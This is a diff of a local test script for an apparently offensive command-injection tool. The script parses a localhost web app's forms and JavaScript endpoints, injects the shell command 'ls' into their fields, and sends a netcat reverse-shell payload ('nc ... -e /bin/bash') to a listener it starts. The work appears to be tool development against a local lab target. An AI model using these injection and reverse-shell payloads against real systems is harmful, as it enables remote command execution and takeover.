@@ -2,14 +2,68 @@
 
 # local tests
 
-from payloads import Parser
+from payloads import Monkey
+
+from server import ReverseListener
 
 url = 'http://127.0.0.1:3111/home'
 
-parser = Parser(url)
+monkey = Monkey(url)
 
-print(parser.get_forms())
-print(parser.get_inputs())
-print(parser.get_js_endpoints())
-print(parser.get_js_urls())
+print('-------------------------Parsing tests-------------------------------')
 
+print(monkey.get_forms())
+print(monkey.get_inputs())
+print(monkey.get_js_endpoints())
+print(monkey.get_js_urls())
+print(monkey.get_js_http_methods())
+
+
+print('-------------------------Form submit tests---------------------------')
+
+injectable = {}
+form_inputs = monkey.get_forms()[0].find_all("input")
+
+for form_input in form_inputs:
+    print(form_input)
+    injectable[form_input.get("name")] = "ls"
+
+res = monkey.inject_forms(injectable)
+
+print(res)
+
+print('-------------------------JS urls submit tests---------------------------')
+
+injectable = {}
+inputs = monkey.get_inputs()
+js_urls = monkey.get_js_urls()
+
+for (input, url) in zip(inputs, js_urls):
+    print(input, url)
+    injectable[input.get("name")] = "ls"
+
+res = monkey.inject_fetch(injectable)
+
+print(res)
+
+print('-------------------------Payload injection tests---------------------')
+
+ip = "127.0.0.1"
+port = 8999
+
+listener = ReverseListener(ip, port, once=True, cb=lambda: 'ls')
+
+listener.start()
+
+print('----------------netcat:')
+
+res = monkey.inject_fetch({ 'command': f"nc {ip} {port} -e /bin/bash\n" })
+print(res)
+
+listener.stop()
+
+print('----------------custom:')
+
+print('todo')
+
+quit()
